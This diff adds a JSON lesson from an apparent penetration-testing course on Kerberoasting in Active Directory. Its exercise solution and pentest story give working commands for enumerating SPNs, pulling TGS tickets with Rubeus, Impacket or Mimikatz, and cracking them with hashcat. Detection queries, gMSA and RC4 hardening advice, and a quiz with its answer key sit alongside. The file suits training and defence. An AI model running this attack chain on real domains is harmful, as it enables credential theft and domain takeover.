@@ -1,0 +1,142 @@
+{
+  "lesson_id": "b2c4d6e8-0f1a-4b3c-9d5e-7f9a1b3c5d7e",
+  "domain": "active_directory",
+  "title": "Kerberoasting for Privilege Escalation",
+  "difficulty": 3,
+  "order_index": 34,
+  "prerequisites": [],
+  "concepts": [
+    "Kerberos TGS tickets and SPNs",
+    "Service Principal Name enumeration",
+    "TGS ticket extraction with Rubeus and Impacket",
+    "Offline password cracking techniques",
+    "Kerberoasting attack workflow",
+    "Detection and defensive measures",
+    "AES256 vs RC4 encryption in Kerberos",
+    "Managed Service Accounts as mitigation"
+  ],
+  "estimated_time": 55,
+  "learning_objectives": [
+    "Explain how Kerberos TGS tickets enable offline password attacks",
+    "Enumerate SPNs and identify Kerberoastable accounts",
+    "Extract TGS tickets using Rubeus and Impacket",
+    "Crack extracted tickets offline with Hashcat",
+    "Implement defensive measures against Kerberoasting",
+    "Distinguish between Group Managed Service Accounts and traditional service accounts"
+  ],
+  "post_assessment": [
+    {
+      "question": "Why can Kerberos TGS tickets be cracked offline?",
+      "options": [
+        "Because Kerberos uses weak encryption by default",
+        "Because the TGS ticket is encrypted with the service account's NT hash, allowing offline cracking",
+        "Because the KDC leaks the password hash",
+        "Because the ticket is transmitted in cleartext"
+      ],
+      "correct_answer": "B",
+      "explanation": "The TGS ticket is encrypted using the service account's NT hash (derived from its password). When you request a TGS for an SPN, the KDC returns a ticket encrypted with that service account's hash. You can then attempt to crack this offline — no further domain interaction needed."
+    },
+    {
+      "question": "Which type of accounts are most vulnerable to Kerberoasting?",
+      "options": [
+        "Domain Admins with SPNs",
+        "Regular user accounts without SPNs",
+        "Service accounts with SPNs and weak passwords",
+        "Computer accounts"
+      ],
+      "correct_answer": "C",
+      "explanation": "Service accounts with SPNs registered are vulnerable because their TGS tickets can be requested by any authenticated user. The vulnerability is amplified when these accounts have weak passwords (easily cracked) or excessive privileges (e.g., Domain Admin group membership)."
+    },
+    {
+      "question": "What PowerShell command enumerates all accounts with SPNs in the domain?",
+      "options": [
+        "Get-ADUser -Filter * -Properties SPN",
+        "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName",
+        "Enum-SPN -All",
+        "Get-SPNAccounts -Domain corp.local"
+      ],
+      "correct_answer": "B",
+      "explanation": "`Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName` filters for accounts that have SPNs set. This returns all Kerberoastable accounts. Option A would return all users but wouldn't filter for SPNs specifically."
+    },
+    {
+      "question": "What is the most effective mitigation against Kerberoasting?",
+      "options": [
+        "Disable Kerberos authentication entirely",
+        "Use Group Managed Service Accounts (gMSA) with long, complex passwords",
+        "Block port 88 on the firewall",
+        "Remove all SPNs from the domain"
+      ],
+      "correct_answer": "B",
+      "explanation": "gMSAs have automatically managed, 240-character passwords that rotate every 30 days. They cannot be cracked offline because the password is unknown and managed by the DC. This eliminates the Kerberoasting attack vector entirely for these accounts."
+    }
+  ],
+  "jim_kwik_principles": [
+    "Active Recall",
+    "Visualization",
+    "Association",
+    "Chunking",
+    "Simplification",
+    "Analogies",
+    "Feynman Technique",
+    "Pattern Recognition",
+    "Spaced Repetition",
+    "Elaborative Rehearsal"
+  ],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "title": "The Attack That Changed AD Security",
+      "content": "Kerberoasting is one of the most devastating AD attacks because it turns a *passive* domain enumeration action into a *high-impact* privilege escalation — and it requires no special privileges.\n\nAny authenticated user can request a TGS ticket. The TGS is encrypted with the service account's password hash. You take that ticket offline, crack it, and now you have the service account's password.\n\nIf that service account happens to be a Domain Admin... game over.\n\nUnderstanding Kerberoasting is essential for both attackers (to find the path) and defenders (to close it). This lesson covers both sides.",
+      "principle": "Analogies"
+    },
+    {
+      "type": "explanation",
+      "title": "Kerberos Refresher and the Kerberoasting Vulnerability",
+      "content": "**Kerberos TGS-REQ/TGS-REP flow (the vulnerable part):**\n\n```\n1. Client → KDC: \"I need a TGS for MSSQLSvc/db01.corp.local:1433\"\n   (TGS-REQ with TGT)\n\n2. KDC → Client: TGS ticket encrypted with the service account's NT hash\n   (TGS-REP)\n\n3. Client decrypts TGS using... wait, the client CAN'T decrypt it.\n   But the client doesn't need to — they just forward it to the service.\n```\n\n**The vulnerability:** Step 2 returns a ticket encrypted with the service account's NT hash. Since any authenticated user can request this ticket, an attacker can:\n\n1. Enumerate accounts with SPNs (these have TGS tickets available)\n2. Request TGS tickets for those SPNs\n3. Take the encrypted TGS offline\n4. Crack the encryption by trying passwords — if the password generates an NT hash that decrypts the ticket correctly, you've found the password\n\n**Why this works:**\n- The KDC happily gives you the encrypted ticket — it's by design\n- No privilege escalation needed — any domain user can do this\n- Cracking happens offline — no lockout, no failed authentication logs\n- Only limited by password strength, not by account lockout\n\n**Kerberos encryption types (cracking difficulty):**\n| Type | Key Size | Cracking Speed |\n|------|----------|---------------|\n| RC4-HMAC | NT hash (MD4) | Very fast |\n| AES128-CTS | AES128 key | Moderate |\n| AES256-CTS | AES256 key | Very slow |\n\nRC4 tickets crack orders of magnitude faster. Domains still supporting RC4 are especially vulnerable."
+    },
+    {
+      "type": "explanation",
+      "title": "The Kerberoasting Attack",
+      "subtitle": "Teach Me Like I'm 10",
+      "content": "Imagine a school with a special rule: any student can go to the front office and request a locked box for any club. The office uses the club's secret password to lock the box.\n\nThe box is designed so that only the club president can open it — but here's the trick: **you can take the box home and try thousands of passwords until it opens.** Nobody at school will know you're doing this because you're at home.\n\n**Kerberoasting in this analogy:**\n- The school = Active Directory\n- The locked boxes = TGS tickets\n- The club passwords = Service account passwords\n- Trying passwords at home = Offline cracking\n- The front office = The KDC (Domain Controller)\n\n**Why it's dangerous:**\n- Any student (any authenticated user) can request a box\n- You can try as many passwords as you want at home (no lockout!)\n- If the club has a weak password, you'll open the box quickly\n- If the club president is also the school principal (Domain Admin)... you now run the school\n\n**The fix:**\n- Make club passwords very long and random (hard to guess)\n- Use special auto-generated passwords that even the club president doesn't know (gMSA)\n- Don't let the school principal run clubs (don't put DA accounts as service accounts)"
+    },
+    {
+      "type": "code_exercise",
+      "title": "Kerberoasting in Practice",
+      "content": "Practice the full Kerberoasting attack chain from enumeration to cracking.",
+      "language": "powershell",
+      "starter_code": "# 1. Enumerate accounts with SPNs\n# 2. Request TGS tickets for those accounts\n# 3. Export the tickets\n# 4. (Offline) Crack the tickets with Hashcat",
+      "solution": "# 1. Enumerate accounts with SPNs using PowerShell\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName, MemberOf, PasswordLastSet, Description | Select-Object Name, ServicePrincipalName, MemberOf, PasswordLastSet\n\n# Alternative: Using Rubeus for enumeration\nRubeus.exe kerberoast /stats\n\n# 2. Request TGS tickets (automatically done by Rubeus)\nRubeus.exe kerberoast /nowrap\n\n# Or with Impacket from Linux:\n# GetUserSPNs.py corp.local/user:password -request -outputfile hashes.txt\n\n# 3. Export tickets (Rubeus does this automatically)\n# The output will contain $krb5tgs$ hashes\n\n# 4. Crack with Hashcat (offline)\nhashcat -m 13100 hashes.txt rockyou.txt\n# Or for RC4 (faster):\nhashcat -m 13100 --rule='best64' hashes.txt rockyou.txt\n\n# Alternative: Using PowerShell AD module only\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken('MSSQLSvc/db01.corp.local:1433')\n# Then use klist or Mimikatz to export:\n# mimikatz # kerberos::list /export",
+      "hint": "Use Get-ADUser with SPN filter for enumeration. Use Rubeus kerberoast for the full attack. Hashcat mode 13100 cracks Kerberos TGS tickets."
+    },
+    {
+      "type": "real_world",
+      "title": "Kerberoasting in a Real Penetration Test",
+      "content": "During a penetration test for a financial institution, we started with a low-privileged user and found:\n\n**Step 1: Enumeration**\n```powershell\n# Found 12 accounts with SPNs\nGet-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName, PasswordLastSet, MemberOf\n\n# Results showed:\n# SVC_BACKUP     - PasswordLastSet: 2019-03-15 (old!)\n# SVC_SQL        - PasswordLastSet: 2020-06-22\n# SVC_IIS        - PasswordLastSet: 2021-01-10\n# SVC_MGMT       - PasswordLastSet: 2018-11-05 (very old!)\n# ... 8 more accounts\n```\n\n**Step 2: Prioritize targets**\n```powershell\n# Check group memberships\n# SVC_MGMT is a member of Domain Admins — JACKPOT\n# SVC_SQL has local admin on SQL servers\n```\n\n**Step 3: Request and crack**\n```bash\n# Request TGS tickets\nRubeus.exe kerberoast /user:SVC_MGMT /nowrap\n\n# Crack offline — RC4 ticket cracked in 4 hours\nhashcat -m 13100 svc_mgmt_hash.txt rockyou.txt\n# Result: SVC_MGMT password = \"Summer2020!\"\n```\n\n**Step 4: Domain Admin**\n```powershell\n# Authenticate as SVC_MGMT\n# Use DA privileges for full domain compromise\n```\n\n**What made this work:**\n1. Service account with weak, dated password\n2. Service account was a Domain Admin (excessive privilege)\n3. RC4 encryption enabled (fast cracking)\n4. No monitoring for TGS requests\n\n**Remediation:**\n- Move SVC_MGMT to gMSA\n- Remove service accounts from Domain Admins\n- Disable RC4 support\n- Monitor for abnormal TGS request patterns",
+      "scenario": "You're a blue team analyst who discovers that 23 service accounts in your domain have SPNs, 5 of which are members of privileged groups. 3 of those have passwords older than 2 years. Describe your remediation plan prioritized by risk."
+    },
+    {
+      "type": "memory_aid",
+      "title": "Kerberoasting Attack Flow — The SEPC Mnemonic",
+      "content": "**SEPC** — The four steps of Kerberoasting:\n\n- **S**PN Enumeration — Find accounts with Service Principal Names\n- **E**xtract TGS — Request tickets for those SPNs\n- **P**assword Crack — Offline cracking with Hashcat\n- **C**ompromise Account — Use cracked credentials for escalation\n\n**Detection keywords to monitor for:**\n- Event ID 4769 with `Encryption Type 0x17` (RC4) — Kerberoasting indicator\n- Multiple TGS requests for different SPNs from the same account\n- TGS requests followed by no corresponding service access\n\n**Defensive SEPC (flip the script):**\n- **S**witch to gMSA — Use Group Managed Service Accounts\n- **E**nforce AES256 — Disable RC4 in Kerberos\n- **P**rotect privileged accounts — Never put DA in service accounts\n- **C**onfigure monitoring — Alert on Event 4769 with RC4 encryption",
+      "technique": "acronym"
+    },
+    {
+      "type": "explanation",
+      "title": "Detection and Defense",
+      "content": "**Detecting Kerberoasting:**\n\n```powershell\n# Monitor Event ID 4769 (Kerberos TGS Request)\n# Key indicators:\n# - Encryption type 0x17 (RC4) — strong Kerberoasting indicator\n# - Single account requesting many TGS tickets in short time\n# - TGS requests for rare/unusual SPNs\n\n# Splunk detection query:\nindex=wineventlog EventCode=4769\n  Ticket_Encryption_Type=0x17\n  | stats count by Account_Name, Service_Name\n  | where count > 5\n```\n\n**Defensive measures (layered approach):**\n\n**Layer 1: Eliminate the target**\n- Use **gMSA** (Group Managed Service Accounts) — auto-managed 240-char passwords\n- If gMSA isn't possible, use strong 25+ character passwords for service accounts\n- Never add service accounts to privileged groups\n\n**Layer 2: Reduce cracking feasibility**\n- **Disable RC4** in Kerberos — force AES256\n- Set `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options → Network security: Configure encryption types allowed for Kerberos` to AES256 only\n- This makes tickets 1000x+ harder to crack\n\n**Layer 3: Detect the attack**\n- Monitor Event ID 4769 for RC4 TGS requests\n- Alert on accounts requesting TGS for many SPNs\n- Use honey accounts with SPNs — if someone requests a TGS for a honey SPN, it's definitely Kerberoasting\n\n**Layer 4: Limit impact**\n- Implement tiered administration\n- Use Protected Users group (blocks RC4 entirely)\n- Regular password rotation for service accounts\n- Audit service account memberships quarterly"
+    },
+    {
+      "type": "reflection",
+      "title": "Kerberoasting Red vs. Blue",
+      "content": "Test your understanding from both perspectives:\n\n**Red Team perspective:**\n1. Why is Kerberoasting considered a 'no privilege required' attack?\n2. What makes RC4 tickets easier to crack than AES256?\n3. How would you prioritize which TGS tickets to crack first?\n\n**Blue Team perspective:**\n4. What Event ID would you monitor for Kerberoasting attempts?\n5. Why is a gMSA immune to Kerberoasting?\n6. How would you identify all Kerberoastable accounts in your domain?\n7. What's the risk of simply disabling RC4 without migrating service accounts first?\n\n**Bonus:** In your AD environment (or a lab), enumerate all accounts with SPNs and check:\n- Which have old passwords (>1 year)?\n- Which are members of privileged groups?\n- Which still support RC4?"
+    },
+    {
+      "type": "mindset_coach",
+      "title": "Think Like Both Sides",
+      "content": "Kerberoasting perfectly illustrates why you need to understand attacks from both perspectives:\n\n**As an attacker:** Any domain user can enumerate SPNs and request TGS tickets. The attack is silent until you start cracking. If a service account has a weak password and high privileges, it's game over.\n\n**As a defender:** You can't prevent TGS requests (they're by design), but you can:\n- Make the tickets uncrackable (gMSA, strong passwords, AES256)\n- Detect the enumeration (Event 4769, honey accounts)\n- Limit the blast radius (tiered admin, no DA service accounts)\n\n**Your action item:** If you have access to an AD environment, run the enumeration command from this lesson today. Find out how many Kerberoastable accounts you have. That number should scare you into action.",
+      "principle": "Association"
+    }
+  ],
+  "tags": ["Course: SANS-SEC560", "Career Path: Pentester", "Career Path: Red Teamer"]
+}
